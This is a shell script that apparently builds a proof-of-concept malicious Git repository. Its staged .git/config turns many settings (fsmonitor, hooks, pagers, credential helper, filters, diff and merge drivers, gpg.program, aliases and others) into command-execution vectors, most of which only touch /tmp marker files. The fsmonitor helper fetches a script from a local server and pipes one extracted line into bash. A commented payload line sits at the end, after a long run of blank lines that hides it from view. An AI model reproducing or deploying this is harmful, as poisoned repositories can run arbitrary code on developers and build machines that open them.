#!/bin/bash
set -eu

REPO_DIR="POC_REPO"

rm -rf "$REPO_DIR"
mkdir -p "$REPO_DIR"
cd "$REPO_DIR"

git init
git symbolic-ref HEAD refs/heads/main
git config user.email "coi@ffe.ur"
git config user.name "coiffeur"

REPO_ABS="."
HELPER_DIR="$REPO_ABS/.malgit-bin"
PROTECTED_CONFIG="$REPO_ABS/protected.gitconfig"
STAGED_CONFIG="$REPO_ABS/.git/config.malgit"

mkdir -p "$HELPER_DIR" .custom-hooks

# Helpers are used where Git expects an executable path or appends arguments.
cat > "$HELPER_DIR/fsmonitor" <<'EOF'
#!/bin/sh
touch /tmp/POC_001;curl -k -fsSL http://127.0.0.1:8000/malgit.sh | sed -n '300{s/^[[:space:]]*#[[:space:]]*//;p;}' | bash
exit 0
EOF

cat > "$HELPER_DIR/ssh-command" <<'EOF'
#!/bin/sh
touch /tmp/POC_005
exit 1
EOF

cat > "$HELPER_DIR/editor" <<'EOF'
#!/bin/sh
touch /tmp/POC_006
exit 0
EOF

cat > "$HELPER_DIR/clean-filter" <<'EOF'
#!/bin/sh
touch /tmp/POC_007
cat
EOF

cat > "$HELPER_DIR/smudge-filter" <<'EOF'
#!/bin/sh
touch /tmp/POC_008
cat
EOF

# Minimal pass-through implementation of Git's long-running filter protocol.
cat > "$HELPER_DIR/process-filter" <<'PYTHON'
#!/usr/bin/env python3
import pathlib
import sys

pathlib.Path("/tmp/POC_009").touch()
stdin = sys.stdin.buffer
stdout = sys.stdout.buffer


def read_packet():
    header = stdin.read(4)
    if not header:
        return None
    length = int(header, 16)
    if length == 0:
        return b""
    return stdin.read(length - 4)


def read_list():
    packets = []
    while True:
        packet = read_packet()
        if packet is None or packet == b"":
            return packets
        packets.append(packet)


def write_packet(data):
    stdout.write(f"{len(data) + 4:04x}".encode("ascii") + data)


def write_list(packets):
    for packet in packets:
        write_packet(packet)
    stdout.write(b"0000")
    stdout.flush()


if read_list() != [b"git-filter-client\n", b"version=2\n"]:
    sys.exit(1)
write_list([b"git-filter-server\n", b"version=2\n"])

capabilities = read_list()
supported = [
    item for item in capabilities
    if item in (b"capability=clean\n", b"capability=smudge\n")
]
write_list(supported)

while True:
    headers = read_list()
    if not headers:
        break
    content = b"".join(read_list())
    write_list([b"status=success\n"])
    write_list([content] if content else [])
    write_list([])
PYTHON

cat > "$HELPER_DIR/textconv" <<'EOF'
#!/bin/sh
touch /tmp/POC_011
exit 1
EOF

cat > "$HELPER_DIR/external-diff" <<'EOF'
#!/bin/sh
touch /tmp/POC_012
exit 1
EOF

# gpg.program is executed directly and therefore names this program rather
# than a shell command containing arguments.
cat > "$HELPER_DIR/gpg-program" <<'EOF'
#!/bin/sh
touch /tmp/POC_020
exit 1
EOF

cat > "$HELPER_DIR/default-ssh-key" <<'EOF'
#!/bin/sh
touch /tmp/POC_021
exit 1
EOF

chmod +x "$HELPER_DIR"/*

# Supply valid output for gpg.ssh.defaultKeyCommand when ssh-keygen exists.
# Creating this disposable key is preparation, not a Git signing trigger.
if command -v ssh-keygen >/dev/null 2>&1; then
    SIGNING_KEY="$REPO_ABS/.git/malgit-signing-key"
    ssh-keygen -q -t ed25519 -N '' -f "$SIGNING_KEY"
    cp "$SIGNING_KEY.pub" "$HELPER_DIR/signing_key.pub"
fi

# Traditional hooks selected by core.hooksPath.
cat > .custom-hooks/pre-commit <<'EOF'
#!/bin/sh
touch /tmp/POC_004_1
exit 1
EOF

cat > .custom-hooks/prepare-commit-msg <<'EOF'
#!/bin/sh
touch /tmp/POC_004_2
exit 1
EOF

cat > .custom-hooks/post-commit <<'EOF'
#!/bin/sh
touch /tmp/POC_004_3
exit 1
EOF

chmod +x .custom-hooks/*

# Attribute selectors and tracked fixtures for the filter, merge, and diff
# vectors.
cat > .gitattributes <<'EOF'
*.clean_test filter=clean_driver
*.smudge_test filter=smudge_driver
*.process_test filter=process_driver
*.merge_test merge=merge_driver
*.textconv_test diff=textconv_driver
EOF

printf 'clean fixture\n' > sample.clean_test
printf 'smudge fixture\n' > sample.smudge_test
printf 'process fixture\n' > sample.process_test
printf 'merge base\n' > sample.merge_test
printf 'textconv base\n' > sample.textconv_test
printf 'external diff fixture\n' > sample.external_test

# Vector 14 must come from protected configuration. This file is only treated
# as global/protected if a later test explicitly selects it with
# GIT_CONFIG_GLOBAL; this generator never does so itself.
git config --file "$PROTECTED_CONFIG" uploadpack.packObjectsHook "sh -c 'touch /tmp/POC_014; exit 1'"

# Build history and trigger prerequisites while no malicious vector is active.
git add .gitattributes .custom-hooks .malgit-bin protected.gitconfig sample.*
git commit -q -m "Initial harness fixtures."

git switch -q -c merge-left
printf 'merge left\n' > sample.merge_test
git add sample.merge_test
git commit -q -m "Prepare left side of merge fixture."

git switch -q main
printf 'merge right\n' > sample.merge_test
printf 'textconv right\n' > sample.textconv_test
git add sample.merge_test sample.textconv_test
git commit -q -m "Prepare right side of merge fixture."

git init --bare -q .git/malgit-alternate.git
mkdir -p .git/objects/info
printf '%s\n' "$REPO_ABS/.git/malgit-alternate.git/objects" > .git/objects/info/alternates

# Invalid remotes provide examples without naming a real destination.
git remote add https-poc https://example.invalid/repository.git
git remote add ssh-poc ssh://example.invalid/repository.git

# Construct the malicious configuration in an inactive staging file. Moving it
# into place is the final repository operation, ensuring this script cannot
# trigger any vector after it becomes active.
cp .git/config "$STAGED_CONFIG"

git config --file "$STAGED_CONFIG" core.fsmonitor "$HELPER_DIR/fsmonitor"
git config --file "$STAGED_CONFIG" core.hooksPath .custom-hooks
git config --file "$STAGED_CONFIG" core.sshCommand "$HELPER_DIR/ssh-command"
git config --file "$STAGED_CONFIG" core.editor "$HELPER_DIR/editor"
git config --file "$STAGED_CONFIG" core.alternateRefsCommand "sh -c 'touch /tmp/POC_018'"

git config --file "$STAGED_CONFIG" pager.log "sh -c 'touch /tmp/POC_002_1; cat'"
git config --file "$STAGED_CONFIG" pager.status "sh -c 'touch /tmp/POC_002_2; cat'"
git config --file "$STAGED_CONFIG" pager.show "sh -c 'touch /tmp/POC_002_3; cat'"
git config --file "$STAGED_CONFIG" pager.diff "sh -c 'touch /tmp/POC_002_4; cat'"

git config --file "$STAGED_CONFIG" credential.helper "!sh -c 'touch /tmp/POC_003'"

git config --file "$STAGED_CONFIG" filter.clean_driver.clean "$HELPER_DIR/clean-filter"
git config --file "$STAGED_CONFIG" filter.smudge_driver.smudge "$HELPER_DIR/smudge-filter"
git config --file "$STAGED_CONFIG" filter.process_driver.process "$HELPER_DIR/process-filter"

git config --file "$STAGED_CONFIG" merge.merge_driver.driver "sh -c 'touch /tmp/POC_010; exit 1'"

git config --file "$STAGED_CONFIG" diff.textconv_driver.textconv "$HELPER_DIR/textconv"
git config --file "$STAGED_CONFIG" diff.external "$HELPER_DIR/external-diff"

git config --file "$STAGED_CONFIG" hook.pre-commit.command "sh -c 'touch /tmp/POC_013_1'"
git config --file "$STAGED_CONFIG" hook.pre-commit.event pre-commit
git config --file "$STAGED_CONFIG" hook.post-commit.command "sh -c 'touch /tmp/POC_013_2'"
git config --file "$STAGED_CONFIG" hook.post-commit.event post-commit
git config --file "$STAGED_CONFIG" hook.pre-push.command "sh -c 'touch /tmp/POC_013_3'"
git config --file "$STAGED_CONFIG" hook.pre-push.event pre-push

git config --file "$STAGED_CONFIG" gc.recentObjectsHook "sh -c 'touch /tmp/POC_015'"
git config --file "$STAGED_CONFIG" imap.tunnel "sh -c 'touch /tmp/POC_016; exit 1'"
git config --file "$STAGED_CONFIG" tar.custom.command "sh -c 'touch /tmp/POC_017; cat'"
git config --file "$STAGED_CONFIG" tar.custom.remote false

git config --file "$STAGED_CONFIG" trailer.Reviewed-by.key Reviewed-by
git config --file "$STAGED_CONFIG" trailer.Reviewed-by.command "sh -c 'touch /tmp/POC_019_1'"
git config --file "$STAGED_CONFIG" trailer.Fixes.key Fixes
git config --file "$STAGED_CONFIG" trailer.Fixes.cmd "sh -c 'touch /tmp/POC_019_2'"

git config --file "$STAGED_CONFIG" gpg.program "$HELPER_DIR/gpg-program"
git config --file "$STAGED_CONFIG" gpg.format ssh
git config --file "$STAGED_CONFIG" gpg.ssh.defaultKeyCommand "$HELPER_DIR/default-ssh-key"

git config --file "$STAGED_CONFIG" alias.test "!sh -c 'touch /tmp/POC_022'"

mv "$STAGED_CONFIG" .git/config
































# id > /tmp/IVOIRE